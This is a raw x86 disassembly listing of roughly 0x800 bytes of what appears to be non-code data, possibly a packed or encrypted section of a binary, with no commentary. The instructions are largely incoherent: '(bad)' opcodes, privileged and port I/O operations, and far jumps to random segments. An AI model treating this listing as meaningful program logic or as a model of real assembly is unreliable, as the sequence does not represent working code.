  41483d:	shr    BYTE PTR [ebp+0x64],1
  414840:	fcomp  QWORD PTR [ecx]
  414842:	dec    ebp
  414843:	mov    eax,ebp
  414845:	fnstenv [ecx-0x5d80cbe5]
  41484b:	inc    edx
  41484c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41484d:	pop    ebp
  41484e:	call   0x9b1eab85
  414853:	cmp    eax,0x2410eea
  414858:	pop    edi
  414859:	push   ebx
  41485a:	bndstx [edx+0x3c9af0a5],bnd0
  414861:	xchg   ecx,eax
  414862:	cmp    BYTE PTR [esp+edx*2-0x11],cl
  414866:	ja     0x41489d
  414868:	sub    BYTE PTR [eax-0x31],bh
  41486b:	cs sub dl,bh
  41486e:	dec    esi
  41486f:	or     BYTE PTR [ecx+0x0],0xe0
  414873:	cmp    DWORD PTR [ecx],eax
  414875:	fucomi st,st(2)
  414877:	push   edx
  414878:	mov    cl,0x92
  41487a:	mov    bh,0x47
  41487c:	gs xchg ebx,eax
  41487e:	or     al,0xf
  414880:	in     eax,dx
  414881:	(bad)  
  414883:	das    
  414884:	imul   ebx,esp,0xffffff8c
  414887:	jl     0x41488b
  414889:	out    0x48,eax
  41488b:	push   ds
  41488c:	pop    es
  41488d:	dec    edi
  41488e:	aad    0xee
  414890:	or     al,0xe
  414892:	adc    DWORD PTR [ebx+0xe],0x17de66fe
  414899:	pop    ebx
  41489a:	push   edi
  41489b:	jle    0x414915
  41489d:	add    DWORD PTR [ecx],ebp
  41489f:	nop
  4148a0:	mov    ebp,0xe89843b0
  4148a5:	fld    TBYTE PTR [edi+0x108cf9]
  4148ab:	jo     0x4148d1
  4148ad:	and    BYTE PTR [edi-0x56692a8f],0xb5
  4148b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148b5:	stos   BYTE PTR es:[edi],al
  4148b6:	inc    ebx
  4148b7:	jmp    0xf54f:0x21836688
  4148be:	jae    0x4148ca
  4148c0:	gs stos DWORD PTR es:[edi],eax
  4148c2:	jl     0x41485d
  4148c4:	push   ds
  4148c5:	leave  
  4148c6:	fld    QWORD PTR ds:0xc880212e
  4148cc:	and    al,0xb0
  4148ce:	sbb    BYTE PTR [ecx],bl
  4148d0:	pusha  
  4148d1:	adc    ch,bh
  4148d3:	dec    esp
  4148d4:	pushf  
  4148d5:	mov    gs,WORD PTR [ebp+0x9b8470b]
  4148db:	pusha  
  4148dc:	jge    0x414946
  4148de:	jns    0x41494d
  4148e0:	sbb    BYTE PTR ds:0xc973fe9c,cl
  4148e6:	mov    ebx,0xd8657790
  4148eb:	cmp    ah,dh
  4148ed:	daa    
  4148ee:	cmp    eax,0xbc3ee868
  4148f3:	call   0x3d8a:0xc8825c00
  4148fa:	aam    0x7f
  4148fc:	or     al,0x6f
  4148fe:	scas   al,BYTE PTR es:[edi]
  4148ff:	jae    0x4148c0
  414901:	or     eax,0x1e287870
  414906:	xor    al,0x57
  414908:	jmp    0x414915
  41490a:	imul   ecx,DWORD PTR [ebx],0xffffff8c
  41490d:	xor    eax,0xe8ec7d06
  414912:	cmc    
  414913:	test   DWORD PTR [esi],edi
  414915:	xchg   esp,eax
  414916:	mov    gs,WORD PTR [ebx]
  414918:	test   bl,0xa3
  41491b:	pop    ebp
  41491c:	push   esi
  41491d:	pop    ds
  41491e:	push   eax
  41491f:	pop    ebx
  414920:	push   ss
  414921:	adc    eax,0xe9ca6b37
  414926:	add    edi,DWORD PTR [edi]
  414928:	(bad)  
  414929:	fimul  DWORD PTR [esi+0x5c0ed25e]
  41492f:	pop    eax
  414930:	in     al,dx
  414931:	adc    edx,ecx
  414933:	mov    edx,edx
  414935:	jge    0x414974
  414937:	les    esi,FWORD PTR [eax+0x15]
  41493a:	mov    ds:0xb008d3b6,eax
  41493f:	in     al,0x43
  414941:	jne    0x4148cd
  414943:	xlat   BYTE PTR ds:[ebx]
  414944:	sub    edx,edi
  414946:	dec    eax
  414947:	std    
  414948:	cmp    al,0xbf
  41494a:	inc    esp
  41494c:	bound  edi,QWORD PTR [ebp+0x38]
  41494f:	xchg   esp,eax
  414950:	xor    ah,0x65
  414953:	xchg   esp,eax
  414954:	(bad)  
  414955:	ss loopne 0x4148e4
  414958:	and    eax,0x4fd1bc0
  41495d:	rcl    bh,0x3b
  414960:	loope  0x414924
  414962:	jo     0x414966
  414964:	cmp    dh,ch
  414966:	add    edx,DWORD PTR [edx+eiz*4+0x6f77c577]
  41496d:	js     0x4149d0
  41496f:	stos   DWORD PTR es:[edi],eax
  414970:	mov    bl,0x10
  414972:	shl    bh,1
  414974:	push   0x50132262
  414979:	fs pop ebp
  41497b:	mov    ch,BYTE PTR [edi]
  41497d:	int3   
  41497e:	xchg   esp,eax
  41497f:	test   DWORD PTR [esi-0x2063d038],edi
  414985:	push   ebp
  414986:	xor    dh,BYTE PTR [eax+edx*4]
  414989:	retf   
  41498a:	add    al,0xb3
  41498c:	sub    eax,0xd24278ac
  414991:	cmp    dh,BYTE PTR [edx-0x7ceb1d59]
  414997:	dec    edi
  414998:	out    dx,al
  414999:	bnd ret 0x57a2
  41499d:	scas   al,BYTE PTR es:[edi]
  41499e:	call   0x4f893873
  4149a3:	cmp    dl,dh
  4149a5:	jb     0x414984
  4149a7:	int3   
  4149a8:	cmp    ecx,DWORD PTR [edi-0x11f6f8d4]
  4149ae:	jl     0x414a07
  4149b0:	repz push ebx
  4149b2:	pop    ss
  4149b3:	push   esp
  4149b4:	aaa    
  4149b5:	or     BYTE PTR [ebx+0x24d34091],dh
  4149bb:	add    BYTE PTR [edx],0xef
  4149be:	and    esi,DWORD PTR [ebp-0x37]
  4149c1:	imul   DWORD PTR [edi]
  4149c3:	in     al,0x66
  4149c5:	test   DWORD PTR [ebx-0x5],eax
  4149c8:	aas    
  4149c9:	sahf   
  4149ca:	out    0xc5,eax
  4149cc:	sub    DWORD PTR [eax-0x6f26a44b],0x16f9306e
  4149d6:	or     BYTE PTR [edx+esi*2],0xb2
  4149da:	sbb    al,0xe4
  4149dc:	mov    ecx,0xab4cdb69
  4149e1:	push   esi
  4149e2:	ror    BYTE PTR [ebx-0x45307369],cl
  4149e8:	test   dl,dh
  4149ea:	push   esp
  4149eb:	jbe    0x414a4c
  4149ed:	test   al,0x8e
  4149ef:	sub    bh,BYTE PTR [eax]
  4149f1:	cmp    esp,DWORD PTR [ebx]
  4149f3:	lods   eax,DWORD PTR ds:[esi]
  4149f4:	sbb    eax,0x6111ed59
  4149f9:	xlat   BYTE PTR ds:[ebx]
  4149fa:	shr    BYTE PTR [ecx+0x4f3dd0e9],cl
  414a00:	push   0xffffffd9
  414a02:	inc    eax
  414a03:	mov    ah,0x31
  414a05:	repz push cs
  414a07:	push   ebp
  414a08:	loope  0x414a7c
  414a0a:	jg     0x414a37
  414a0c:	iret   
  414a0d:	cmp    DWORD PTR [ebp-0x5],edx
  414a10:	mov    ds,WORD PTR [ebx]
  414a12:	or     ecx,ebp
  414a14:	cwde   
  414a15:	mov    ds:0x480d543,al
  414a1a:	aas    
  414a1b:	jmp    0xc69da6fd
  414a20:	cmp    eax,ecx
  414a22:	pusha  
  414a23:	scas   al,BYTE PTR es:[edi]
  414a24:	fwait
  414a25:	dec    esi
  414a26:	cmc    
  414a27:	test   DWORD PTR [ecx],0x8a72795c
  414a2d:	(bad)
  414a31:	rcr    DWORD PTR [edx-0x188dc067],0x64
  414a38:	push   edi
  414a39:	js     0x414a9c
  414a3b:	test   al,0xa0
  414a3d:	(bad)  
  414a3e:	(bad)  
  414a3f:	je     0x4149cd
  414a41:	adc    esp,DWORD PTR [ebp-0x1e]
  414a44:	loopne 0x414a47
  414a46:	xlat   BYTE PTR ds:[ebx]
  414a47:	pop    ss
  414a48:	sbb    eax,0x2f180507
  414a4d:	pop    edi
  414a4e:	adc    DWORD PTR [eax+0x41],esi
  414a51:	xchg   DWORD PTR [edi+edi*1+0x54],edx
  414a55:	shr    BYTE PTR [esi],0xb8
  414a58:	test   DWORD PTR [esi-0x1],ecx
  414a5b:	and    bl,BYTE PTR [ebx+0x29]
  414a5e:	rcl    BYTE PTR [ecx],0x8
  414a61:	dec    edi
  414a62:	sub    edx,DWORD PTR [eax-0x1b]
  414a65:	jne    0x414ab0
  414a67:	pop    ecx
  414a68:	sbb    ch,BYTE PTR [esi+0x252a0d41]
  414a6e:	xor    BYTE PTR [esi],bh
  414a70:	adc    al,0x4f
  414a72:	sub    BYTE PTR [eax+0x90dee3e],ch
  414a78:	in     eax,dx
  414a79:	enter  0xf06,0x37
  414a7d:	adc    BYTE PTR [esi+ebp*8],bl
  414a80:	ins    DWORD PTR es:[edi],dx
  414a81:	out    dx,eax
  414a82:	dec    esp
  414a83:	inc    ecx
  414a84:	adc    ebp,DWORD PTR [edi]
  414a86:	iret   
  414a87:	mov    esi,DWORD PTR [ebp+eax*1-0x2a]
  414a8b:	fmul   QWORD PTR [ecx-0x57]
  414a8e:	sahf   
  414a8f:	or     bh,BYTE PTR [edx+0x8f120a]
  414a95:	fidivr WORD PTR [ecx-0x70]
  414a98:	imul   DWORD PTR [eax+eax*1-0x3fc6e1fa]
  414a9f:	pop    esp
  414aa0:	in     eax,0xfb
  414aa2:	push   ebx
  414aa3:	mov    BYTE PTR [edx],cl
  414aa5:	out    dx,al
  414aa6:	jae    0x414af9
  414aa8:	xor    bl,dh
  414aaa:	pop    esp
  414aab:	outs   dx,BYTE PTR ds:[esi]
  414aac:	fisttp DWORD PTR [edx-0x21f63f4c]
  414ab2:	cmc    
  414ab3:	sbb    al,0x81
  414ab5:	jecxz  0x414ab3
  414ab7:	mov    ecx,0xd18bc5d7
  414abc:	in     eax,0xfc
  414abe:	push   esp
  414abf:	pop    ds
  414ac0:	sbb    al,0x99
  414ac2:	cmp    al,0x93
  414ac4:	loop   0x414a5c
  414ac6:	aam    0x6c
  414ac8:	push   edi
  414ac9:	repz fmul QWORD PTR [esi-0x72473532]
  414ad0:	mov    esi,0x1cd95b4b
  414ad5:	xor    eax,0x8e858dff
  414ada:	sbb    BYTE PTR ds:0xf90380d2,cl
  414ae0:	pop    edi
  414ae1:	mov    ds:0x1740515,eax
  414ae6:	enter  0x5148,0xfb
  414aea:	pop    ebp
  414aeb:	bound  ebp,QWORD PTR [ebp-0x695b4237]
  414af1:	pop    ds
  414af2:	loop   0x414a76
  414af4:	outs   dx,BYTE PTR ds:[esi]
  414af5:	jg     0x414aa2
  414af7:	mov    cl,0xfa
  414af9:	sbb    al,0xf0
  414afb:	sbb    eax,esi
  414afd:	xor    DWORD PTR [esi+esi*2+0x72],esi
  414b01:	shl    BYTE PTR [edx+0x578a0cf0],1
  414b07:	cwde   
  414b08:	loop   0x414b88
  414b0a:	sbb    BYTE PTR [eax],dl
  414b0c:	sahf   
  414b0d:	jmp    0xc09f184b
  414b12:	pop    esp
  414b13:	and    BYTE PTR es:[ebx+eax*8+0x3c],dl
  414b18:	inc    esp
  414b19:	xor    ch,bl
  414b1b:	or     eax,0x72797bad
  414b20:	mov    ds:0x46679cfd,al
  414b25:	call   0x417a6a37
  414b2a:	in     eax,0xdc
  414b2c:	inc    ebp
  414b2d:	xor    ebx,ebx
  414b2f:	lea    ebx,[esi-0x2c6e2bd6]
  414b35:	(bad)  
  414b36:	repnz (bad) 
  414b38:	lods   eax,DWORD PTR ds:[esi]
  414b39:	cmp    BYTE PTR [ebx-0x65cadbcb],ch
  414b3f:	push   edx
  414b40:	xchg   edx,eax
  414b41:	repnz outs dx,DWORD PTR ds:[esi]
  414b43:	arpl   WORD PTR [ebx+eax*8],sp
  414b46:	loopne 0x414bc4
  414b48:	ins    BYTE PTR es:[edi],dx
  414b49:	mov    ds:0xb8f1eb00,al
  414b4e:	ss stos DWORD PTR es:[edi],eax
  414b50:	push   esp
  414b51:	lods   al,BYTE PTR ds:[esi]
  414b52:	les    edx,FWORD PTR [edx-0x70]
  414b55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b56:	pop    ebp
  414b57:	and    DWORD PTR [edx+0x2d],eax
  414b5a:	aam    0xdb
  414b5c:	inc    edi
  414b5d:	inc    ebx
  414b5e:	imul   edi,DWORD PTR [ebx-0x21dac0fe],0xfffffff8
  414b65:	loope  0x414b7e
  414b67:	hlt    
  414b68:	scas   al,BYTE PTR es:[edi]
  414b69:	in     eax,dx
  414b6a:	xor    bh,ch
  414b6c:	jge    0x414be1
  414b6e:	aaa    
  414b6f:	mov    ch,BYTE PTR [edx+0x38]
  414b72:	fucomp st(0)
  414b74:	into   
  414b75:	inc    ebx
  414b76:	test   eax,0x4f432a88
  414b7b:	mov    esp,0x7a777499
  414b80:	xchg   ebp,eax
  414b81:	jbe    0x414b7c
  414b83:	in     eax,0x43
  414b85:	enter  0x82ed,0xbd
  414b89:	imul   edi,ecx,0x266e0a0f
  414b8f:	jo     0x414b39
  414b91:	mov    bl,0xd3
  414b93:	iret   
  414b94:	xor    BYTE PTR [eax],0xb0
  414b97:	nop
  414b98:	lds    ebx,FWORD PTR [eax+0x3a8449f0]
  414b9e:	xchg   esi,eax
  414b9f:	add    bh,bl
  414ba1:	jle    0x414bce
  414ba3:	pop    esp
  414ba4:	push   ss
  414ba5:	jo     0x414bee
  414ba7:	sbb    eax,0x20bf05d0
  414bac:	cmp    dh,bh
  414bae:	pusha  
  414baf:	sub    eax,0x31fd717e
  414bb4:	fdiv   DWORD PTR [ecx+0x14]
  414bb7:	push   esi
  414bb8:	mov    ecx,0xc153d701
  414bbd:	mov    eax,0xfa7bb7f6
  414bc2:	(bad)  
  414bc3:	and    DWORD PTR [esi+0x7f],esi
  414bc6:	jo     0x414b94
  414bc8:	out    0xb7,eax
  414bca:	icebp  
  414bcb:	push   es
  414bcc:	or     eax,0xab2028ab
  414bd1:	in     al,dx
  414bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414bd3:	cli    
  414bd4:	(bad)  
  414bd5:	xchg   ebp,eax
  414bd6:	push   esi
  414bd7:	aad    0xda
  414bd9:	mov    bl,0x33
  414bdb:	pop    ss
  414bdc:	mov    al,ds:0x7d468a90
  414be1:	xlat   BYTE PTR ds:[ebx]
  414be2:	xor    bl,bh
  414be4:	jo     0x414c5e
  414be6:	out    dx,al
  414be7:	es dec ecx
  414be9:	pop    ss
  414bea:	lock cwde 
  414bec:	pop    ebx
  414bed:	mov    bl,0xe4
  414bef:	jne    0x414c33
  414bf1:	mov    ds:0xb85c8cd8,al
  414bf6:	add    dh,0xc5
  414bf9:	pushf  
  414bfa:	pop    ss
  414bfb:	inc    edx
  414bfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bfd:	or     BYTE PTR [esi],ah
  414bff:	xchg   BYTE PTR [edi-0xb],dl
  414c02:	test   edi,ebp
  414c04:	or     eax,0x1dc109dd
  414c09:	pop    eax
  414c0a:	add    ch,dh
  414c0c:	js     0x414c52
  414c0e:	ret    
  414c0f:	xor    ah,BYTE PTR [eax+0x74]
  414c12:	(bad)  
  414c13:	popa   
  414c14:	pop    ds
  414c15:	lahf   
  414c16:	cmp    al,0xb1
  414c18:	call   edx
  414c1a:	(bad)  [eax+0x6c2dbc61]
  414c20:	int    0xb0
  414c22:	sub    eax,0x1d1cd8b
  414c27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c28:	xchg   edi,eax
  414c29:	test   DWORD PTR [ebx-0x72],esi
  414c2c:	aas    
  414c2d:	dec    edx
  414c2e:	mov    ebx,DWORD PTR [edi+0x4cd4908f]
  414c34:	add    al,0x9d
  414c36:	dec    ebx
  414c37:	sub    eax,0xb06dfc28
  414c3c:	clc    
  414c3d:	int    0x86
  414c3f:	inc    ecx
  414c40:	sti    
  414c41:	stos   BYTE PTR es:[edi],al
  414c42:	mov    ch,0x9f
  414c44:	xchg   edx,eax
  414c45:	mov    edi,0xa1f193b0
  414c4a:	mov    esi,0x7aab6a3d
  414c4f:	jge    0x414c65
  414c51:	mov    DWORD PTR [ebp+0x6f3b6eb9],esp
  414c57:	jbe    0x414caf
  414c59:	addr16 in eax,0x96
  414c5c:	add    edx,ebp
  414c5e:	lea    esi,[edi-0xf]
  414c61:	xchg   esp,eax
  414c62:	mov    ds:0xd7c6712c,al
  414c67:	mov    dl,BYTE PTR [esi]
  414c69:	pop    ecx
  414c6a:	and    DWORD PTR ds:0x12f94656,ebp
  414c70:	xchg   ebp,eax
  414c71:	jp     0x414ce8
  414c73:	lahf   
  414c74:	sbb    eax,0xeaef5b0e
  414c79:	mov    ds:0xbf807c35,eax
  414c7e:	jmp    0xd216:0xa6818c99
  414c85:	pushf  
  414c86:	xchg   BYTE PTR [ebx+esi*1-0x67199b0],cl
  414c8d:	je     0x414cb5
  414c8f:	dec    DWORD PTR [eax-0x1f8d9d9e]
  414c95:	outs   dx,DWORD PTR ds:[esi]
  414c96:	xchg   esp,eax
  414c97:	lock inc esp
  414c99:	mov    ah,BYTE PTR [ecx]
  414c9b:	adc    eax,0x2ca43672
  414ca0:	push   0x3c
  414ca2:	clc    
  414ca3:	dec    ebp
  414ca4:	je     0x414c88
  414ca6:	aaa    
  414ca7:	sub    cl,BYTE PTR [edi+0xfa6c9a5]
  414cad:	out    0x97,al
  414caf:	pushf  
  414cb0:	(bad)  
  414cb1:	scas   al,BYTE PTR es:[edi]
  414cb2:	mov    edi,0xec8e5eca
  414cb7:	test   eax,0xe7030626
  414cbc:	pop    ebp
  414cbd:	and    cl,cl
  414cbf:	inc    edi
  414cc0:	jmp    0x8771:0xa4265484
  414cc7:	les    esi,FWORD PTR [ecx-0x27]
  414cca:	mov    ecx,0xc138ad9b
  414ccf:	mov    ds:0x299257bc,al
  414cd4:	push   edi
  414cd5:	gs dec edx
  414cd7:	or     esp,DWORD PTR [ecx+0x6a]
  414cda:	sbb    esi,ebp
  414cdc:	dec    esp
  414cdd:	jl     0x414c64
  414cdf:	add    eax,0x6c652eaf
  414ce4:	jae    0x414cdd
  414ce6:	cs push ecx
  414ce8:	mov    bl,0x4c
  414cea:	sub    DWORD PTR [edi+eiz*8],esi
  414ced:	inc    ebp
  414cee:	sub    eax,DWORD PTR [edi+ebp*2-0x1b]
  414cf2:	mov    cl,0xe7
  414cf4:	push   ebp
  414cf5:	out    dx,eax
  414cf6:	mov    DWORD PTR [esi],esp
  414cf8:	add    DWORD PTR [edx+0x3],ebx
  414cfb:	jmp    0x2a6fc3f0
  414d00:	push   ebx
  414d01:	addr16 push 0x390c6a2e
  414d07:	repnz add BYTE PTR [ecx+ebp*2],bl
  414d0b:	mul    BYTE PTR [edx+0x49]
  414d0e:	leave  
  414d0f:	jb     0x414d90
  414d11:	or     DWORD PTR [ebx+0x4],0xffffffae
  414d15:	int3   
  414d16:	mov    al,0x48
  414d18:	(bad)  
  414d19:	pop    esp
  414d1a:	pusha  
  414d1b:	fstp   QWORD PTR [edi-0xd]
  414d1e:	mov    cl,0x30
  414d20:	ins    DWORD PTR es:[edi],dx
  414d21:	cmp    eax,0x29522768
  414d26:	and    al,0x5c
  414d28:	cmp    ch,BYTE PTR [ecx-0x1e]
  414d2b:	adc    eax,0x567b75e7
  414d30:	bound  ebp,QWORD PTR [ebp+0x16]
  414d33:	cmp    al,0x98
  414d35:	jecxz  0x414cdd
  414d37:	cmp    eax,DWORD PTR [eax]
  414d39:	pop    esi
  414d3a:	jb     0x414d24
  414d3c:	inc    edx
  414d3d:	outs   dx,BYTE PTR ds:[esi]
  414d3e:	xor    eax,DWORD PTR [ebp+0x79]
  414d41:	inc    esp
  414d42:	cli    
  414d43:	loop   0x414d13
  414d45:	nop
  414d46:	cmp    DWORD PTR [eax-0x7bf62fca],edi
  414d4c:	fidivr WORD PTR [edi+0x706414e1]
  414d52:	or     al,0x5c
  414d54:	mov    eax,ds:0x7ed4c02c
  414d59:	jmp    0x414dcb
  414d5b:	jl     0x414d4c
  414d5d:	aas    
  414d5e:	jns    0x414d09
  414d60:	jnp    0x414d3a
  414d62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d63:	lds    edx,FWORD PTR [esp+ebx*2]
  414d66:	sub    ebx,DWORD PTR [edi+0x1d455a0b]
  414d6c:	mov    edx,cs
  414d6e:	sub    eax,0x81d9e813
  414d73:	in     eax,0xd7
  414d75:	sahf   
  414d76:	sti    
  414d77:	pushf  
  414d78:	xlat   BYTE PTR ds:[ebx]
  414d79:	and    esp,DWORD PTR [edx+0x21]
  414d7c:	and    BYTE PTR [ecx+eiz*2-0x31],al
  414d80:	(bad)  
  414d82:	push   ebx
  414d83:	ins    DWORD PTR es:[edi],dx
  414d84:	inc    edx
  414d85:	sub    eax,0xd4f0f7f8
  414d8a:	mov    ds:0x62fe1330,eax
  414d8f:	and    eax,0x683ff089
  414d94:	clc    
  414d95:	(bad)  
  414d96:	jmp    0x414d36
  414d98:	jge    0x414d23
  414d9a:	ins    BYTE PTR es:[edi],dx
  414d9b:	mov    esp,0x8c712d56
  414da0:	jl     0x414dae
  414da2:	je     0x414de8
  414da4:	jg     0x414e1e
  414da6:	ror    DWORD PTR [ebp+eiz*4+0x3aa8ae5d],1
  414dad:	mov    esp,0xb8938395
  414db2:	push   cs
  414db3:	js     0x414d45
  414db5:	pop    eax
  414db6:	int    0x3e
  414db8:	mov    esi,0x474808e2
  414dbd:	and    edi,DWORD PTR [esi+ebx*8]
  414dc0:	cmp    al,0xbc
  414dc2:	jmp    0x4772854b
  414dc7:	or     dl,BYTE PTR [ebx]
  414dc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414dca:	mov    cs,ecx
  414dcc:	in     eax,dx
  414dcd:	jno    0x414dbe
  414dcf:	mov    eax,0xd3a186e1
  414dd4:	mov    WORD PTR [ebp-0x1],fs
  414dd7:	push   es
  414dd8:	fcom   QWORD PTR [esi]
  414dda:	xor    al,0x86
  414ddc:	jge    0x414e04
  414dde:	imul   ebp,DWORD PTR [eax],0x7cab5d6
  414de4:	shr    DWORD PTR [esi-0xa19e43c],cl
  414dea:	sbb    DWORD PTR [eax+edx*2],eax
  414ded:	into   
  414dee:	cdq    
  414def:	xlat   BYTE PTR ds:[ebx]
  414df0:	into   
  414df1:	ret    0x4563
  414df4:	xor    eax,0x87b92f48
  414df9:	test   BYTE PTR [edx-0x6],dh
  414dfc:	pop    ecx
  414dfd:	stc    
  414dfe:	jg     0x414dca
  414e00:	dec    ebp
  414e01:	pushf  
  414e02:	iret   
  414e03:	lea    eax,[edi+0x5a]
  414e06:	ja     0x414de4
  414e08:	enter  0x5086,0x6e
  414e0c:	cmp    eax,0x9c8ce5f1
  414e11:	hlt    
  414e12:	pop    ss
  414e13:	ret    
  414e14:	pop    eax
  414e15:	imul   ebx,DWORD PTR [ecx-0x692da95f],0x54
  414e1c:	sub    DWORD PTR [edi],0xffffffa8
  414e1f:	xchg   esi,eax
  414e20:	stos   DWORD PTR es:[edi],eax
  414e21:	les    ecx,FWORD PTR [edi+edi*2+0x5e7c4f8]
  414e28:	push   edi
  414e29:	scas   al,BYTE PTR es:[edi]
  414e2a:	daa    
  414e2b:	call   0x9b2bc3d7
  414e30:	aas    
  414e31:	hlt    
  414e32:	push   es
  414e33:	mov    ecx,0x4df3cc08
  414e38:	dec    eax
  414e39:	cmp    al,0x6
  414e3b:	mov    ch,0x26
  414e3d:	add    dh,BYTE PTR [eax]
  414e3f:	push   0xffffff84
  414e41:	bound  ebx,QWORD PTR [ecx+0x4a]
  414e44:	cmp    DWORD PTR [ecx-0x1841b078],0x41f01254
  414e4e:	xchg   ebp,ebx
  414e50:	(bad)  
  414e52:	repnz scas al,BYTE PTR es:[edi]
  414e54:	jnp    0x414dfd
  414e56:	push   eax
  414e57:	sbb    BYTE PTR ss:[ecx+0x62],ch
  414e5b:	adc    al,0x29
  414e5d:	stos   BYTE PTR es:[edi],al
  414e5e:	ficomp DWORD PTR [ecx]
  414e60:	adc    edx,DWORD PTR [ebx+0xc76254e]
  414e66:	in     eax,dx
  414e67:	push   esp
  414e68:	xor    ch,BYTE PTR [ebp-0x3fb8a037]
  414e6e:	in     al,0xf8
  414e70:	jne    0x414e0a
  414e72:	xlat   BYTE PTR ds:[ebx]
  414e73:	mov    ds:0xeb90df6a,al
  414e78:	jg     0x414e6c
  414e7a:	imul   esp,esp,0xffffff89
  414e7d:	mov    dh,0xcd
  414e7f:	xor    eax,0x1190a79d
  414e84:	stos   DWORD PTR es:[edi],eax
  414e85:	in     eax,dx
  414e86:	nop
  414e87:	mov    ecx,cr1
  414e8a:	fld    QWORD PTR [eax+0x74]
  414e8d:	jns    0x414e87
  414e8f:	repnz or BYTE PTR [edi-0x1884d2c7],bh
  414e96:	(bad)
  414e99:	cmp    al,BYTE PTR [ebx]
  414e9b:	mov    cl,0xa5
  414e9d:	cli    
  414e9e:	xchg   esi,eax
  414e9f:	aam    0x2f
  414ea1:	imul   ebx,DWORD PTR [eax],0x7d396d5
  414ea7:	neg    BYTE PTR [esi+0x29]
  414eaa:	unpcklps xmm3,XMMWORD PTR [ecx-0x7f4ae280]
  414eb1:	dec    esp
  414eb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414eb3:	mov    ah,0x19
  414eb5:	repz sbb eax,0xbcb289ed
  414ebb:	add    esi,ebp
  414ebd:	push   ebx
  414ebe:	jne    0x414f3b
  414ec0:	ja     0x414e94
  414ec2:	adc    eax,0x9f305918
  414ec7:	dec    edi
  414ec8:	fwait
  414ec9:	dec    ebp
  414eca:	sub    al,0x47
  414ecc:	mov    DWORD PTR [ebx+0x595989a6],esi
  414ed2:	scas   al,BYTE PTR es:[edi]
  414ed3:	call   0x1e56:0x36bf7a92
  414eda:	dec    esi
  414edb:	aam    0xbf
  414edd:	cs inc ebx
  414edf:	ins    BYTE PTR es:[edi],dx
  414ee0:	or     eax,ebp
  414ee2:	xchg   BYTE PTR [edi],al
  414ee4:	push   edi
  414ee5:	stos   BYTE PTR es:[edi],al
  414ee6:	cmp    al,0xc
  414ee8:	out    dx,eax
  414ee9:	(bad)  
  414eea:	xor    eax,0x2d580498
  414eef:	inc    ecx
  414ef0:	scas   al,BYTE PTR es:[edi]
  414ef1:	dec    esp
  414ef2:	xchg   ebp,eax
  414ef3:	and    eax,0x4fca0160
  414ef8:	int3   
  414ef9:	jle    0x414ea3
  414efb:	call   0xf948b5bb
  414f00:	(bad)  
  414f01:	mov    es,WORD PTR [ecx+0x1a]
  414f04:	(bad)  
  414f05:	out    0x68,al
  414f07:	push   ebp
  414f08:	and    BYTE PTR [esi-0x6],dl
  414f0b:	pop    es
  414f0c:	jp     0x414ed4
  414f0e:	jecxz  0x414eeb
  414f10:	rcl    DWORD PTR [esi-0x3d],cl
  414f13:	dec    BYTE PTR [ebx+0x54]
  414f16:	mov    dl,0x2d
  414f18:	and    al,0x35
  414f1a:	imul   edi,DWORD PTR [esi+eax*1-0x6b],0xffffffad
  414f1f:	mov    eax,DWORD PTR [ebx+0x2a3afc79]
  414f25:	sbb    eax,DWORD PTR [edi]
  414f27:	jmp    0xd53d:0xbc69813f
  414f2e:	mov    ah,0x4
  414f30:	xor    al,0xd2
  414f32:	(bad)  
  414f33:	jmp    0x414f19
  414f35:	loop   0x414f3e
  414f37:	push   esp
  414f38:	in     al,dx
  414f39:	out    dx,al
  414f3a:	lock test DWORD PTR [esi+0x69],eax
  414f3e:	add    BYTE PTR [ebx],cl
  414f40:	jecxz  0x414f0b
  414f42:	and    bl,dl
  414f44:	call   0xcb6e:0x26c52547
  414f4b:	xor    BYTE PTR ds:0x51c9a775,bl
  414f51:	sbb    DWORD PTR [edi-0xe7301a8],0x2
  414f58:	and    ch,BYTE PTR [ebx+0x149dfa69]
  414f5e:	fldenv [ebp-0x32]
  414f61:	je     0x414f9d
  414f63:	aas    
  414f64:	jno    0x414f28
  414f66:	sbb    DWORD PTR [esi+0x2b],esp
  414f69:	lods   al,BYTE PTR ds:[esi]
  414f6a:	in     al,dx
  414f6b:	adc    eax,0xdc32cbb
  414f70:	xchg   BYTE PTR [edx+0x69],dl
  414f73:	sbb    al,0x34
  414f75:	xchg   esp,eax
  414f76:	fstp   TBYTE PTR [ecx-0x2b1a734f]
  414f7c:	test   al,0x82
  414f7e:	out    dx,al
  414f7f:	mov    dl,0xcc
  414f81:	cmp    eax,0x5c490438
  414f86:	out    dx,eax
  414f87:	stos   BYTE PTR es:[edi],al
  414f88:	dec    edx
  414f89:	push   0x3e
  414f8b:	push   ecx
  414f8c:	adc    esi,DWORD PTR [edi]
  414f8e:	push   0x40
  414f90:	inc    esp
  414f91:	sbb    eax,0x681501bb
  414f96:	std    
  414f97:	retf   
  414f98:	cmp    eax,DWORD PTR [ebx+0x26]
  414f9b:	mov    BYTE PTR [eax+0x66],ch
  414f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f9f:	sub    ch,BYTE PTR [edx+ebp*1]
  414fa2:	fsubp  st(3),st
  414fa4:	inc    eax
  414fa5:	add    al,0xaf
  414fa7:	call   0x85bb41a2
  414fac:	fs xor bh,bh
  414faf:	push   ebp
  414fb0:	mov    esp,0x4f14abca
  414fb5:	into   
  414fb6:	das    
  414fb7:	cmp    ch,BYTE PTR [edi+0x44d3cd3]
  414fbd:	popf   
  414fbe:	daa    
  414fbf:	or     BYTE PTR [ebx-0x55],ch
  414fc2:	mov    al,0xbe
  414fc4:	or     bh,dl
  414fc6:	test   eax,0x39bf569c
  414fcb:	mov    WORD PTR [edi-0x4b493f8c],cs
  414fd1:	add    al,bl
  414fd3:	adc    al,0x83
  414fd5:	shl    BYTE PTR [ebp+0x17],1
  414fd8:	ds inc ecx
  414fda:	and    DWORD PTR [ebx-0x5f],0x899269a1
  414fe1:	push   cs
  414fe2:	mov    al,0x9d
  414fe4:	dec    ebx
  414fe5:	into   
